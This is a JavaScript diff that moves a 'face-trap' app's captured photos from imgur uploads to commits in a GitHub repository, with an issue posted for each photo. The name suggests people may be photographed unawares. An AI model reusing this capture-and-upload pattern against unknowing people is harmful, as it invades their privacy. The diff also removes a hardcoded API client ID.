@@ -404,23 +404,24 @@ function getToken(){
 }
 
 async function sendPhoto(){
-  let imgUrl=''
+  const tk=getToken(),b64=capturedData.split(',')[1]
+  const ts=new Date()
+  const fn=ts.getFullYear()+''+(ts.getMonth()+1).toString().padStart(2,'0')+''+ts.getDate().toString().padStart(2,'0')+'_'+ts.getHours().toString().padStart(2,'0')+ts.getMinutes().toString().padStart(2,'0')+ts.getSeconds().toString().padStart(2,'0')+'.jpg'
+  const title=ts.getFullYear()+'-'+(ts.getMonth()+1).toString().padStart(2,'0')+'-'+ts.getDate().toString().padStart(2,'0')+' '+ts.getHours().toString().padStart(2,'0')+':'+ts.getMinutes().toString().padStart(2,'0')
+  let rawUrl=''
   try{
-    const b64=capturedData.split(',')[1]
-    const r=await fetch('https://api.imgur.com/3/image',{
-      method:'POST',
-      headers:{Authorization:'Client-ID 546c25a59c58ad7','Content-Type':'application/x-www-form-urlencoded'},
-      body:'image='+encodeURIComponent(b64)
+    const r=await fetch('https://api.github.com/repos/'+CONFIG.PHOTO_REPO+'/contents/photos/'+fn,{
+      method:'PUT',
+      headers:{Authorization:'Bearer '+tk,'Content-Type':'application/json','User-Agent':'face-trap'},
+      body:JSON.stringify({message:title,content:b64,branch:'main'})
     })
     const j=await r.json()
-    if(j.success) imgUrl=j.data.link
+    if(j.content) rawUrl='https://raw.githubusercontent.com/'+CONFIG.PHOTO_REPO+'/main/photos/'+fn
   }catch(e){}
-  const ts=new Date()
-  const title=ts.getFullYear()+'-'+(ts.getMonth()+1).toString().padStart(2,'0')+'-'+ts.getDate().toString().padStart(2,'0')+' '+ts.getHours().toString().padStart(2,'0')+':'+ts.getMinutes().toString().padStart(2,'0')
-  const body=imgUrl?'[img]('+imgUrl+')':'![]('+capturedData+')'
+  const body=rawUrl?'![]('+rawUrl+')':'![]('+capturedData+')'
   try{
     await fetch('https://api.github.com/repos/'+CONFIG.PHOTO_REPO+'/issues',{
-      method:'POST',headers:{Authorization:'Bearer '+getToken(),'Content-Type':'application/json','User-Agent':'face-trap'},
+      method:'POST',headers:{Authorization:'Bearer '+tk,'Content-Type':'application/json','User-Agent':'face-trap'},
       body:JSON.stringify({title,body})
     })
   }catch(e){}
